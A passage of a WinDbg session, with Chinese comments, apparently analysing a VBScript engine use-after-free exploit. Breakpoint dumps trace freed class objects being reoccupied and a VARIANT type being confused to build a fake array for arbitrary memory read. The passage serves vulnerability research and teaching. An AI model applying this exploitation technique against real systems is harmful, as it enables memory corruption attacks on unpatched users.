class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; sxe ld:Vbscript</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6d720000 6d78b000   C:\Windows\system32\vbscript.dll</span><br><span class="line">eax=026197d0 ebx=00000000 ecx=0000003f edx=00000070 esi=7ffda000 edi=0261c3fc</span><br><span class="line">eip=77c770b4 esp=0261c314 ebp=0261c368 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">77c770b4 c3              ret</span><br><span class="line">0:005&gt; bp vbscript!VbsIsEmpty</span><br><span class="line">0:005&gt; bl</span><br><span class="line">     0 e Disable Clear  6d73c206     0001 (0001)  0:**** vbscript!VbsIsEmpty</span><br><span class="line"></span><br><span class="line">0:008&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257cd24 ecx=68d0a9d8 edx=0257cc9c esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257cbb8 ebp=0257cbc8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">//wild_ref_arr_a</span><br><span class="line">0:005&gt; dd poi(poi(poi(esp+c)+c)+c)       //&#x4FDD;&#x5B58;class_ter_a&#x5BF9;&#x8C61;&#x7684;&#x6570;&#x7EC4;wild_ref_arr_a&#xFF08;6&#xFF09;</span><br><span class="line">0044f178  00000009 005de638 01d49588 00000000</span><br><span class="line">0044f188  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">0044f198  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">0044f1a8  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">0044f1b8  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">0044f1c8  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">0044f1d8  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">0044f1e8  4c725f53 00001810 003ad1f0 004010d8</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257cd24 ecx=68d0a9d8 edx=0257cc9c esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257cbb8 ebp=0257cbc8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(poi(esp+c)+8) l4           //&#x5360;&#x4F4D;&#x7684;setprop_a_1&#x5BF9;&#x8C61;</span><br><span class="line">01d482f8  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 01d49588                      //setprop_a_1&#x5BF9;&#x8C61;&#x5185;&#x5B58;&#x7ED3;&#x6784;</span><br><span class="line">01d49588  68cb1748 00000002 01d4cae8 005dd0b0</span><br><span class="line">01d49598  00000a58 00000000 00000000 00000000</span><br><span class="line">01d495a8  00000000 00406fec 00000000 01d49550</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd poi(poi(01019cd0+8)+34)   //CDISPIDTable Offset</span><br><span class="line">01d4cb20  01d4eea4 01d4eed8 01d4ef18 00020000</span><br><span class="line">01d4cb30  545a0903 0b000001 01742a01 00010000</span><br><span class="line">    </span><br><span class="line">0:005&gt; du 01d4eea4</span><br><span class="line">01d4eea4  &quot;L].]&#xA030;&#x1D4;&#xC994;&#x257;.&quot;//&#x4E71;&#x7801;&#xFF1F;&#xFF1F;</span><br><span class="line">0:005&gt; du 01d4eea4+30</span><br><span class="line">01d4eed4  &quot;P&quot;</span><br><span class="line">0:005&gt; du 01d4eed8 +30</span><br><span class="line">01d4ef08  &quot;SetProp&quot;</span><br><span class="line">0:005&gt; du 01d4ef18 +30</span><br><span class="line">01d4ef48  &quot;mem&quot;</span><br><span class="line">0:005&gt; dd 01d4ef18  l4 //setprop_a_1&#x5BF9;&#x8C61;mem&#x6210;&#x5458;&#x5185;&#x5B58;</span><br><span class="line">01d4ef48  00000000 00000000 00000000 00000000</span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257cd24 ecx=68d0a9d8 edx=0257cc9c esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257cbb8 ebp=0257cbc8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(poi(poi(esp+c)+c)+c)  //&#x4FDD;&#x5B58;class_ter_b&#x5BF9;&#x8C61;&#x7684;&#x6570;&#x7EC4;wild_ref_arr_b&#xFF08;6&#xFF09;</span><br><span class="line">00401060  68cb0009 01d4958c 01d495f8 68cb4211</span><br><span class="line">00401070  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">00401080  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">00401090  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">004010a0  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">004010b0  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">004010c0  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">004010d0  4c725f53 00001810 0044f1f0 003ee2f0</span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257cd24 ecx=68d0a9d8 edx=0257cc9c esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257cbb8 ebp=0257cbc8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(poi(esp+c)+8) l4                      //&#x5360;&#x4F4D;&#x7684;setprop_a_2&#x5BF9;&#x8C61;</span><br><span class="line">01d482f8  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">0:005&gt; dd 01d495f8                                  //setprop_a_2&#x5BF9;&#x8C61;&#x5185;&#x5B58;&#x7ED3;&#x6784;</span><br><span class="line">01d495f8  68cb1748 00000002 01d4cb78 005dd0b0</span><br><span class="line">01d49608  00000a58 00000000 00000000 00000000</span><br><span class="line">01d49618  00000000 00407024 00000000 01d49588</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(poi(01d495f8+8)+34)   //CDISPIDTable Offset</span><br><span class="line">01d4cbb0  01d4efbc 01d4eff0 01d4f030 000003dc</span><br><span class="line">01d4cbc0  00010002 0001583c 0b120300 01740a01</span><br><span class="line">01d4cbd0  00020000 345a1303 0b000001 01742a01</span><br><span class="line">    </span><br><span class="line">0:005&gt; du 01d4efbc</span><br><span class="line">01d4efbc  &quot;L].]&#xA080;&#x1D4;&#xC994;&#x257;.&quot;//&#x4E71;&#x7801;&#xFF1F;&#xFF1F;</span><br><span class="line">0:005&gt; du 01d4efbc+30</span><br><span class="line">01d4efec  &quot;P&quot;</span><br><span class="line">0:005&gt; du 01d4eff0 +30</span><br><span class="line">01d4f020  &quot;SetProp&quot;</span><br><span class="line">0:005&gt; du 01d4f030 +30</span><br><span class="line">01d4f060  &quot;mem&quot;</span><br><span class="line">0:005&gt; dd 01d4f030 </span><br><span class="line">01d4f060  00000000 00000000 00000000 00000000//setprop_a_2&#x5BF9;&#x8C61;mem&#x6210;&#x5458;&#x5185;&#x5B58;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257c2e0 ecx=68d0a9d8 edx=0257c258 esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257c174 ebp=0257c184 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(poi(poi(esp+c)+c)+c)   //&#x91CA;&#x653E;wild_ref_arr_a&#x6570;&#x7EC4;&#xFF0C;&#x5373;&#x91CA;&#x653E;&#x524D;&#x9762;&#x5360;&#x4F4D;&#x7684;setprop_a_1&#x5BF9;&#x8C61;</span><br><span class="line">0044f178  02570002 0257c110 00000000 0000200c</span><br><span class="line">0044f188  02570002 0257c110 00000000 0000200c</span><br><span class="line">0044f198  02570002 0257c110 00000000 0000200c</span><br><span class="line">0044f1a8  02570002 0257c110 00000000 0000200c</span><br><span class="line">0044f1b8  02570002 0257c110 00000000 0000200c</span><br><span class="line">0044f1c8  02570002 0257c110 00000000 0000200c</span><br><span class="line">0044f1d8  02570002 0257c110 00000000 0000200c</span><br><span class="line">0044f1e8  4c725f53 00001810 003ad1f0 004010d8</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257c2e0 ecx=68d0a9d8 edx=0257c258 esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257c174 ebp=0257c184 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(poi(esp+c)+8) l4                  //&#x5360;&#x4F4D;&#x7684;class_fun_a&#x5BF9;&#x8C61; </span><br><span class="line">01d482b8  00000009 00000000 01d49588 00000020</span><br><span class="line">0:005&gt; dd poi(poi(01d49588+8)+34)</span><br><span class="line">01d4cb20  01d4eea4 01d4eeec 01d4ef24 00020000</span><br><span class="line">01d4cb30  545a0903 0b000001 01742a01 00010000</span><br><span class="line">    </span><br><span class="line">0:005&gt; du 01d4eea4 +30</span><br><span class="line">01d4eed4  &quot;Read_Memory&quot;//&#x51FD;&#x6570;&#x6210;&#x5458;</span><br><span class="line">0:005&gt; du 01d4eeec +30</span><br><span class="line">01d4ef1c  &quot;SPP&quot;//&#x51FD;&#x6570;&#x6210;&#x5458;</span><br><span class="line">0:005&gt; du 01d4ef24 +30</span><br><span class="line">01d4ef54  &quot;mem&quot;//&#x53D8;&#x91CF;&#x6210;&#x5458;</span><br><span class="line">0:005&gt; dd 01d4ef24 </span><br><span class="line">01d4ef24  00000008 00000000 00443be4 00000020//class_fun_a.mem&#x7684;&#x5185;&#x5B58;VARIANT&#x7ED3;&#x6784;&#xFF0C;&#x6CE8;&#x610F;&#x8BE5;&#x5730;&#x5740;</span><br><span class="line">01d4ef34  00000000 00000000 0000822f 00000006</span><br><span class="line">    </span><br><span class="line">0:005&gt; dc 00443be4 l6</span><br><span class="line">00443be4  08800001 00000001 00000000 00000000  ................//&#x5199;&#x5165;&#x8FDB;&#x6765;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x53D8;&#x91CF;FAKESAFEARRAY</span><br><span class="line">00443bf4  7fffffff 00000000     </span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257c2e0 ecx=68d0a9d8 edx=0257c258 esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257c174 ebp=0257c184 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(poi(poi(esp+c)+c)+c)  </span><br><span class="line">0044f178  00000009 00000000 01d49588 00000020//&#x7528;class_fun_a&#x586B;&#x5145;&#x6570;&#x7EC4;wild_ref_arr_a(6)</span><br><span class="line">0044f188  00000009 00000000 01d49588 00000020</span><br><span class="line">0044f198  00000009 00000000 01d49588 00000020</span><br><span class="line">0044f1a8  00000009 00000000 01d49588 00000020</span><br><span class="line">0044f1b8  00000009 00000000 01d49588 00000020</span><br><span class="line">0044f1c8  00000009 00000000 01d49588 00000020</span><br><span class="line">0044f1d8  00000009 00000000 01d49588 00000020</span><br><span class="line">0044f1e8  4c725f53 00001810 003ad1f0 004010d8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=697b185c ebx=025cd044 ecx=6980a9d8 edx=025ccfbc esi=01ce1de0 edi=00000001</span><br><span class="line">eip=697cc206 esp=025cced8 ebp=025ccee8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">697cc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(poi(esp+c)+8)               //&#x6267;&#x884C;setprop_a_1.setprop(getp_b)&#x4E4B;&#x540E;&#x7684;setprop_a_1</span><br><span class="line">01d482f8  68cb0009 01d4958c 01d49588 68cb4211</span><br><span class="line">01d48308  00000000 00000000 257d500f 0801802e</span><br><span class="line"></span><br><span class="line">0:005&gt;  dd 01d4ef18 l4 </span><br><span class="line">01d4ef18  02570005 0257c110 00000000 0000200c //174088534690791e-324&#x88AB;&#x5199;&#x5165;&#x539F;&#x5148;&#x7684;setprop_a_1.mem</span><br><span class="line">01d4ef28  00000000 00443be4 00000020 00000000</span><br><span class="line">0:005&gt; dd poi(poi(01d49588 +8)+34) l8</span><br><span class="line">01d4cb20  01d4eea4 01d4eeec 01d4ef24 00020000</span><br><span class="line">01d4cb30  545a0903 0b000001 01742a01 00010000</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 01d4ef24 l8    //&#x5F53;&#x524D;setprop_a_1.mem&#x3001;&#x5373;class_fun_a.mem &#x6570;&#x636E;&#x7C7B;&#x578B;&quot;0008&quot;&#x7ECF;&#x8FC7;&#x9519;&#x4F4D;&#x4FEE;&#x6539;&#x4E3A;&quot;200c&quot;</span><br><span class="line">01d4ef24  0000200c 00000000 00443be4 00000020</span><br><span class="line">01d4ef34  00000000 00000000 0000822f 00000006</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 00443be4 l6</span><br><span class="line">00443be4  08800001 00000001 00000000 00000000  //setprop_a_1.mem&#x6307;&#x5411;&#x7684;&#x6570;&#x7EC4;&#x7ED3;&#x6784;byte szBuff[80000000]</span><br><span class="line">00443bf4  7fffffff 00000000</span><br><span class="line">    </span><br><span class="line">//&#x4E0A;&#x8FF0;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x53D6;&#x7684;&#x91CD;&#x70B9;&#x5728;&#x4E8E;&#x6700;&#x540E;&#x4F7F;&#x7528;class_fun_a&#x5360;&#x4F4D;&#x7A7A;&#x95F4;&#x65F6;&#xFF0C;vbs&#x5F15;&#x64CE;&#x5E76;&#x672A;&#x6E05;&#x7406;&#x6389;&#x4E4B;&#x524D;setprop_a_1&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;mem&#xFF0C;</span><br><span class="line">//&#x800C;&#x8BE5;&#x53D8;&#x91CF;&#x5730;&#x5740;&#x521A;&#x597D;&#x4E0E;class_fun_a.mem&#x76F8;&#x5DEE;0xC&#xFF08;&#x4E3A;&#x4EC0;&#x4E48;&#xFF1F;&#xFF1F;&#xFF1F;&#xFF09;&#xFF0C;&#x4EE5;&#x81F3;&#x4E8E;&#x540E;&#x7EED;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x7C7B;&#x578B;&#x6DF7;&#x6DC6;&#x6784;&#x9020;&#x51FA;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x7EC4;&#x7ED3;&#x6784;&#x3002;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257c2e0 ecx=68d0a9d8 edx=0257c258 esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257c174 ebp=0257c184 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line">dd poi(poi(poi(esp+c)+c)+c)   //&#x91CA;&#x653E;wild_ref_arr_b&#x6570;&#x7EC4;&#xFF0C;&#x5373;&#x91CA;&#x653E;&#x524D;&#x9762;&#x5360;&#x4F4D;&#x7684;setprop_a_2&#x5BF9;&#x8C61;</span><br><span class="line">0:005&gt; dd poi(poi(poi(esp+c)+c)+c)</span><br><span class="line">00401060  005d0002 0257c158 00000000 00000003</span><br><span class="line">00401070  005d0002 0257c158 00000000 00000003</span><br><span class="line">00401080  005d0002 0257c158 00000000 00000003</span><br><span class="line">00401090  005d0002 0257c158 00000000 00000003</span><br><span class="line">004010a0  005d0002 0257c158 00000000 00000003</span><br><span class="line">004010b0  005d0002 0257c158 00000000 00000003</span><br><span class="line">004010c0  005d0002 0257c158 00000000 00000003</span><br><span class="line">004010d0  4c725f53 00001810 0044f1f0 003ee2f0</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257c2e0 ecx=68d0a9d8 edx=0257c258 esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257c174 ebp=0257c184 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(poi(esp+c)+8) l4  </span><br><span class="line">01d482b8  00000009 00000000 01d495f8 00000020  //&#x5360;&#x4F4D;&#x7684;class_fun_a&#x5BF9;&#x8C61; </span><br><span class="line">0:005&gt; dd poi(poi(01d495f8 +8)+34)</span><br><span class="line">01d4cbb0  01d4efbc 01d4f004 01d4f03c 000003dc</span><br><span class="line">01d4cbc0  00010002 0001583c 0b120300 01740a01</span><br><span class="line">    </span><br><span class="line">0:005&gt; du 01d4efbc +30</span><br><span class="line">01d4efec  &quot;Read_Memory&quot;</span><br><span class="line">0:005&gt; du 01d4f004 +30</span><br><span class="line">01d4f034  &quot;SPP&quot;</span><br><span class="line">0:005&gt; du 01d4f03c +30</span><br><span class="line">01d4f06c  &quot;mem&quot;</span><br><span class="line">0:005&gt; dd 01d4f03c </span><br><span class="line">01d4f03c  00000008 00000000 00443bbc 00000020 //class_fun_a.mem&#x7684;&#x5185;&#x5B58;VARIANT&#x7ED3;&#x6784;&#xFF0C;&#x6CE8;&#x610F;&#x8BE5;&#x5730;&#x5740;</span><br><span class="line">01d4f04c  00000000 00000000 0000822f 00000006</span><br><span class="line">    </span><br><span class="line">0:005&gt; dc 00443bbc  l6</span><br><span class="line">00443bbc  00000000 00000000 00000000 00000000  ................////&#x5199;&#x5165;&#x8FDB;&#x6765;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x53D8;&#x91CF;fake_str</span><br><span class="line">00443bcc  7f8e0000 952e5f0f                    ....._..</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257c2e0 ecx=68d0a9d8 edx=0257c258 esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257c174 ebp=0257c184 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(poi(poi(esp+c)+c)+c)  </span><br><span class="line">00401060  00000009 00000000 01d495f8 00000020//&#x7528;class_fun_a&#x586B;&#x5145;&#x6570;&#x7EC4;wild_ref_arr_b(6)</span><br><span class="line">00401070  00000009 00000000 01d495f8 00000020</span><br><span class="line">00401080  00000009 00000000 01d495f8 00000020</span><br><span class="line">00401090  00000009 00000000 01d495f8 00000020</span><br><span class="line">004010a0  00000009 00000000 01d495f8 00000020</span><br><span class="line">004010b0  00000009 00000000 01d495f8 00000020</span><br><span class="line">004010c0  00000009 00000000 01d495f8 00000020</span><br><span class="line">004010d0  4c725f53 00001810 0044f1f0 003ee2f0</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=68cb185c ebx=0257cd24 ecx=68d0a9d8 edx=0257cc9c esi=01d51bd0 edi=00000001</span><br><span class="line">eip=68ccc206 esp=0257cbb8 ebp=0257cbc8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68ccc206 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(poi(esp+c)+8)   //&#x6267;&#x884C;setprop_a_2.SetProp(getp_b)&#x4E4B;&#x540E;&#x7684;setprop_a_2</span><br><span class="line">01d482f8  68cb0009 01d495fc 01d495f8 68cb4211</span><br><span class="line">01d48308  00000000 00000000 257d500f 0801802e</span><br><span class="line"></span><br><span class="line">0:005&gt;   dd 01d4f030 l4 </span><br><span class="line">01d4f030  005d0005 0257c158 00000000 00000003 //636598737289582e-328&#x88AB;&#x5199;&#x5165;&#x539F;&#x5148;&#x7684;setprop_a_2.mem</span><br><span class="line"></span><br><span class="line">0:005&gt;  dd poi(poi(01d495f8+8)+34) l8</span><br><span class="line">01d4cbb0  01d4efbc 01d4f004 01d4f03c 000003dc</span><br><span class="line">01d4cbc0  00010002 0001583c 0b120300 01740a01</span><br><span class="line">0:005&gt; dd 01d4f03c  l8      //&#x5F53;&#x524D;setprop_a_2.mem&#x3001;&#x5373;class_fun_a.mem &#x6570;&#x636E;&#x7C7B;&#x578B;&quot;0008&quot;&#x7ECF;&#x8FC7;&#x9519;&#x4F4D;&#x4FEE;&#x6539;&#x4E3A;&quot;0003&quot;</span><br><span class="line">01d4f03c  00000003 00000000 00443bbc 00000020</span><br><span class="line">01d4f04c  00000000 00000000 0000822f 00000006</span><br><span class="line">0:005&gt; dd 00443bbc  l6</span><br><span class="line">00443bbc  00000000 00000000 00000000 00000000 //setprop_a_2.mem&#x6307;&#x5411;&#x7684;&#x6570;&#x7EC4;&#x7ED3;&#x6784;byte szBuff[]</span><br><span class="line">00443bcc  7f8e0000 952e5f0f</span><br><span class="line"></span><br><span class="line">//&#x4E0A;&#x8FF0;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x53D6;&#x7684;&#x91CD;&#x70B9;&#x5728;&#x4E8E;&#x6700;&#x540E;&#x4F7F;&#x7528;class_fun_a&#x5360;&#x4F4D;&#x7A7A;&#x95F4;&#x65F6;&#xFF0C;vbs&#x5F15;&#x64CE;&#x5E76;&#x672A;&#x6E05;&#x7406;&#x6389;&#x4E4B;&#x524D;setprop_a_2&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;mem&#xFF0C;</span><br><span class="line">//&#x800C;&#x8BE5;&#x53D8;&#x91CF;&#x5730;&#x5740;&#x521A;&#x597D;&#x4E0E;class_fun_a.mem&#x76F8;&#x5DEE;0xC&#xFF08;&#x4E3A;&#x4EC0;&#x4E48;&#xFF1F;&#xFF1F;&#xFF1F;&#xFF09;&#xFF0C;&#x4EE5;&#x81F3;&#x4E8E;&#x540E;&#x7EED;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x7C7B;&#x578B;&#x6DF7;&#x6DC6;&#x6784;&#x9020;&#x51FA;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x7EC4;&#x7ED3;&#x6784;&#x3002;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68aec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)              //&#x6539;&#x53D8;&#x7C7B;&#x578B;&#x524D;&#x7684;rw_var </span><br><span class="line">0066e790  00000003 00000000 00499d9c 0000000</span><br><span class="line"></span><br><span class="line">0:005&gt; dd 00499d9c</span><br><span class="line">00499d9c  00000000 00000000 00000000 00000000//rw_var&#x6570;&#x636E;</span><br><span class="line">00499dac  00000000 00000000 00000000 2a298cb6</span><br><span class="line">00499dbc  88000000 00000000 00000000 00000000</span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=6712185c ebx=024bcc74 ecx=6717a9d8 edx=024bcbec esi=01f9241c edi=00000001</span><br><span class="line">eip=6713c206 esp=024bcb08 ebp=024bcb18 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6713c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">0066e760  00000001 000007ff 0066e908 02000002//a = EmptyFunc  a = null    //a&#x7684;&#x5185;&#x5B58;VARIANT&#x7ED3;&#x6784;</span><br><span class="line">0:005&gt; dd 0066e908</span><br><span class="line">0066e908  671e4934 00000001 0066e1c8 01f21f58</span><br><span class="line">0066e918  01f24754 00000000 0066e1c8 01f181f8</span><br><span class="line">0066e928  101fd8ae 08000726 671e4934 